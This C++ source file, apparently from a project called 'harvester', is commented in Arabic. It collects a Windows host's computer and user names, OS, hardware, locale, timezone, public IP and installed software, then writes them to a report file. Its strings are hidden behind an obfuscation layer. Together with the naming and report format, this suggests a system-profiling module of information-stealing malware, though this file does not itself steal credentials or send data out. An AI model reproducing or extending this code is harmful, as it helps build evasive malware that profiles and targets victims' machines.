// harvester/system/system_info.cpp
// تنفيذ دوال جمع معلومات النظام (نسخة مصححة)
#include "system_info.h"
#include "../crypto/obfuscation.h"
#include <windows.h>
#include <wininet.h>
#include <comdef.h>
#include <Wbemidl.h>
#include <string>
#include <sstream>
#include <fstream>
#include <vector>
#include <algorithm>
#include <cctype>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "wbemuuid.lib")

// دالة مساعدة لتحويل wide string إلى string
static std::string WStringToString(const std::wstring& wstr) {
    if (wstr.empty()) return "";
    int len = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
    if (len <= 0) return "";
    std::string result(len - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &result[0], len, NULL, NULL);
    return result;
}

// دالة مساعدة لقراءة قيمة من الريجستري (string)
static std::string GetRegistryString(HKEY hKeyRoot, const std::string& subKey, const std::string& valueName) {
    HKEY hKey;
    if (RegOpenKeyExA(hKeyRoot, subKey.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return "";
    char buffer[1024];
    DWORD size = sizeof(buffer);
    DWORD type;
    if (RegQueryValueExA(hKey, valueName.c_str(), NULL, &type, (LPBYTE)buffer, &size) != ERROR_SUCCESS || type != REG_SZ) {
        RegCloseKey(hKey);
        return "";
    }
    RegCloseKey(hKey);
    return std::string(buffer);
}

// الحصول على عنوان IP العام عبر HTTP
std::string GetPublicIP() {
    std::string apiURL = GetObfuscatedString(STR_IP_API_URL);     // "https://api.ipify.org"
    HINTERNET hSession = InternetOpenA(GetObfuscatedString(STR_USER_AGENT).c_str(), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hSession) return "";
    HINTERNET hConnect = InternetOpenUrlA(hSession, apiURL.c_str(), NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE, 0);
    if (!hConnect) {
        InternetCloseHandle(hSession);
        return "";
    }
    char buffer[128];
    DWORD bytesRead;
    std::string ip;
    while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        ip += buffer;
    }
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);
    // إزالة whitespace
    ip.erase(remove_if(ip.begin(), ip.end(), ::isspace), ip.end());
    return ip;
}

// الحصول على اسم المعالج عبر WMI
static std::string GetCPUName() {
    std::string cpuName = "Unknown";
    HRESULT hres;
    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres)) return cpuName;
    hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    IWbemLocator* pLoc = NULL;
    hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
    if (SUCCEEDED(hres)) {
        IWbemServices* pSvc = NULL;
        // استخدم 0 بدلاً من NULL للمعامل LONG
        hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, 0, NULL, 0, &pSvc);
        if (SUCCEEDED(hres)) {
            hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
            IEnumWbemClassObject* pEnumerator = NULL;
            hres = pSvc->ExecQuery(bstr_t("WQL"), bstr_t("SELECT Name FROM Win32_Processor"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
            if (SUCCEEDED(hres)) {
                IWbemClassObject* pclsObj = NULL;
                ULONG uReturn = 0;
                while (pEnumerator) {
                    HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
                    if (uReturn == 0) break;
                    VARIANT vtProp;
                    hr = pclsObj->Get(L"Name", 0, &vtProp, 0, 0);
                    if (SUCCEEDED(hr) && vtProp.vt == VT_BSTR) {
                        cpuName = WStringToString(vtProp.bstrVal);
                        VariantClear(&vtProp);
                    }
                    pclsObj->Release();
                }
                pEnumerator->Release();
            }
            pSvc->Release();
        }
        pLoc->Release();
    }
    CoUninitialize();
    return cpuName;
}

// الحصول على حجم الذاكرة العشوائية
static std::string GetRAMSize() {
    MEMORYSTATUSEX mem;
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    unsigned long long totalMB = mem.ullTotalPhys / (1024 * 1024);
    unsigned long long totalGB = totalMB / 1024;
    if (totalGB > 0)
        return std::to_string(totalGB) + " GB";
    else
        return std::to_string(totalMB) + " MB";
}

// الحصول على اسم بطاقة الرسومات (اختياري)
static std::string GetGPUName() {
    std::string gpuName = "Unknown";
    HRESULT hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres)) return gpuName;
    IWbemLocator* pLoc = NULL;
    hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
    if (SUCCEEDED(hres)) {
        IWbemServices* pSvc = NULL;
        hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, 0, NULL, 0, &pSvc);
        if (SUCCEEDED(hres)) {
            hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
            IEnumWbemClassObject* pEnumerator = NULL;
            hres = pSvc->ExecQuery(bstr_t("WQL"), bstr_t("SELECT Name FROM Win32_VideoController"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
            if (SUCCEEDED(hres)) {
                IWbemClassObject* pclsObj = NULL;
                ULONG uReturn = 0;
                while (pEnumerator) {
                    HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
                    if (uReturn == 0) break;
                    VARIANT vtProp;
                    hr = pclsObj->Get(L"Name", 0, &vtProp, 0, 0);
                    if (SUCCEEDED(hr) && vtProp.vt == VT_BSTR) {
                        gpuName = WStringToString(vtProp.bstrVal);
                        VariantClear(&vtProp);
                        pclsObj->Release();
                        break;
                    }
                    pclsObj->Release();
                }
                pEnumerator->Release();
            }
            pSvc->Release();
        }
        pLoc->Release();
    }
    CoUninitialize();
    return gpuName;
}

// قائمة البرامج المثبتة من الريجستري
std::vector<std::string> GetInstalledSoftware() {
    std::vector<std::string> software;
    HKEY hKey;
    std::string uninstallPath = GetObfuscatedString(STR_REG_UNINSTALL);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, uninstallPath.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD index = 0;
        char subKeyName[256];
        DWORD size;
        while (true) {
            size = sizeof(subKeyName);
            if (RegEnumKeyExA(hKey, index, subKeyName, &size, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
                break;
            std::string fullPath = uninstallPath + "\\" + subKeyName;
            HKEY hSubKey;
            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, fullPath.c_str(), 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
                char displayName[256];
                DWORD bufSize = sizeof(displayName);
                DWORD type;
                if (RegQueryValueExA(hSubKey, "DisplayName", NULL, &type, (LPBYTE)displayName, &bufSize) == ERROR_SUCCESS && type == REG_SZ) {
                    software.push_back(displayName);
                }
                RegCloseKey(hSubKey);
            }
            index++;
        }
        RegCloseKey(hKey);
    }
    // WOW6432Node للبرامج 32-bit على نظام 64-bit
    std::string uninstallPathWow = GetObfuscatedString(STR_REG_UNINSTALL_WOW64);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, uninstallPathWow.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD index = 0;
        char subKeyName[256];
        DWORD size;
        while (true) {
            size = sizeof(subKeyName);
            if (RegEnumKeyExA(hKey, index, subKeyName, &size, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
                break;
            std::string fullPath = uninstallPathWow + "\\" + subKeyName;
            HKEY hSubKey;
            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, fullPath.c_str(), 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
                char displayName[256];
                DWORD bufSize = sizeof(displayName);
                DWORD type;
                if (RegQueryValueExA(hSubKey, "DisplayName", NULL, &type, (LPBYTE)displayName, &bufSize) == ERROR_SUCCESS && type == REG_SZ) {
                    software.push_back(displayName);
                }
                RegCloseKey(hSubKey);
            }
            index++;
        }
        RegCloseKey(hKey);
    }
    return software;
}

// جمع كل معلومات النظام
SystemInfo CollectSystemInfo() {
    SystemInfo info;
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    if (GetComputerNameA(computerName, &size))
        info.computerName = computerName;
    else
        info.computerName = "Unknown";
    
    char userName[256];
    DWORD userSize = sizeof(userName);
    if (GetUserNameA(userName, &userSize))
        info.userName = userName;
    else
        info.userName = "Unknown";
    
    // نظام التشغيل – بسيط عبر GetVersionEx أو ريجستري
    info.osVersion = GetRegistryString(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName");
    if (info.osVersion.empty()) info.osVersion = "Windows";
    
    // البنية المعمارية – عبر GetNativeSystemInfo
    SYSTEM_INFO sysInfo;
    GetNativeSystemInfo(&sysInfo);
    if (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
        info.architecture = "x64";
    else if (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
        info.architecture = "x86";
    else if (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64)
        info.architecture = "ARM64";
    else
        info.architecture = "Unknown";
    
    info.ram = GetRAMSize();
    info.cpu = GetCPUName();
    info.gpu = GetGPUName();
    
    // اللغة – استخدم GetUserDefaultUILanguage مع تحويل إلى char* عبر WideCharToMultiByte
    LCID lcid = GetUserDefaultUILanguage();
    wchar_t localeNameW[LOCALE_NAME_MAX_LENGTH];
    if (LCIDToLocaleName(lcid, localeNameW, LOCALE_NAME_MAX_LENGTH, 0)) {
        int len = WideCharToMultiByte(CP_UTF8, 0, localeNameW, -1, NULL, 0, NULL, NULL);
        if (len > 0) {
            std::vector<char> localeNameA(len);
            WideCharToMultiByte(CP_UTF8, 0, localeNameW, -1, localeNameA.data(), len, NULL, NULL);
            info.language = localeNameA.data();
        } else {
            info.language = "en-US";
        }
    } else {
        info.language = "en-US";
    }
    
    // المنطقة الزمنية
    TIME_ZONE_INFORMATION tz;
    GetTimeZoneInformation(&tz);
    char tzName[256];
    WideCharToMultiByte(CP_UTF8, 0, tz.StandardName, -1, tzName, sizeof(tzName), NULL, NULL);
    info.timezone = tzName;
    
    info.ipAddress = GetPublicIP();
    info.installedSoftware = GetInstalledSoftware();
    
    return info;
}

// حفظ معلومات النظام في ملف نصي
void SaveSystemInfoToFile(const SystemInfo& info, const std::string& outputDir) {
    std::string filePath = outputDir + "\\" + GetObfuscatedString(STR_SYSTEM_TXT); // "system_info.txt"
    std::ofstream out(filePath);
    if (!out.is_open()) return;
    
    out << GetObfuscatedString(STR_PC_USER_INFORMATION) << ":" << std::endl;
    out << "- " << GetObfuscatedString(STR_IP_ADDRESS) << ": " << info.ipAddress << std::endl;
    out << "- " << GetObfuscatedString(STR_COMPUTER_NAME) << ": " << info.computerName << std::endl;
    out << "- " << GetObfuscatedString(STR_USER_NAME) << ": " << info.userName << std::endl;
    out << "- " << GetObfuscatedString(STR_OS_VERSION) << ": " << info.osVersion << std::endl;
    out << "- " << GetObfuscatedString(STR_ARCHITECTURE) << ": " << info.architecture << std::endl;
    out << "- " << GetObfuscatedString(STR_RAM) << ": " << info.ram << std::endl;
    out << "- " << GetObfuscatedString(STR_CPU) << ": " << info.cpu << std::endl;
    out << "- " << GetObfuscatedString(STR_GPU) << ": " << info.gpu << std::endl;
    out << "- " << GetObfuscatedString(STR_LANGUAGE) << ": " << info.language << std::endl;
    out << "- " << GetObfuscatedString(STR_TIMEZONE) << ": " << info.timezone << std::endl;
    out << std::endl;
    out << GetObfuscatedString(STR_INSTALLED_SOFTWARE) << " (" << info.installedSoftware.size() << "):" << std::endl;
    for (const auto& sw : info.installedSoftware) {
        out << "  - " << sw << std::endl;
    }
    out.close();
}